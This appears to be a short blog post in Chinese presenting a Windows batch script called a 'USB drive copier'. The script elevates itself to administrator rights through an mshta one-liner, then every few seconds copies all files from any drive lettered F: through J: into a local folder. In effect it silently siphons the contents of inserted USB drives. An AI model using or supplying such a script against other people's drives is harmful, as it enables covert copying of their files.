<!DOCTYPE html><head><title>用批处理弄个 U 盘复制器 - kkocdko's blog</title><meta name="description" content="使用Win下的Robocopy"><script src="/bundle.js" onload="[].flat||(location='/update.html')"></script></head><main><article><h1>用批处理弄个 U 盘复制器</h1><pre><code class="language-batch">fltmc&gt;nul||mshta vbscript:CreateObject(&quot;Shell.Application&quot;).ShellExecute(&quot;%~dpnx0&quot;,&quot;%*&quot;,&quot;&quot;,&quot;runas&quot;,1)(window.close)&amp;&amp;exit

set &quot;Destination=D:\k\CopiedFiles\&quot;
set &quot;Extension=*&quot;

if not exist &quot;%Destination%&quot; ( md &quot;%Destination%&quot; )
goto Main

:Copier
if exist %Source% (robocopy %Source% %Destination% *.%Extension% /s /ndl /nfl)
goto :eof

:Main

echo CreateObject(&quot;scripting.filesystemobject&quot;).deletefile(WScript.scriptfullname)&gt;%Temp%\SleepScript.vbs&amp;&amp;echo WScript.sleep WScript.Arguments(0)&gt;&gt;%Temp%\SleepScript.vbs
start /wait %Temp%\SleepScript.vbs 5000

set &quot;Source=F:\&quot;
call :Copier

set &quot;Source=G:\&quot;
call :Copier

set &quot;Source=H:\&quot;
call :Copier

set &quot;Source=I:\&quot;
call :Copier

set &quot;Source=J:\&quot;
call :Copier

goto Main</code></pre></article></main>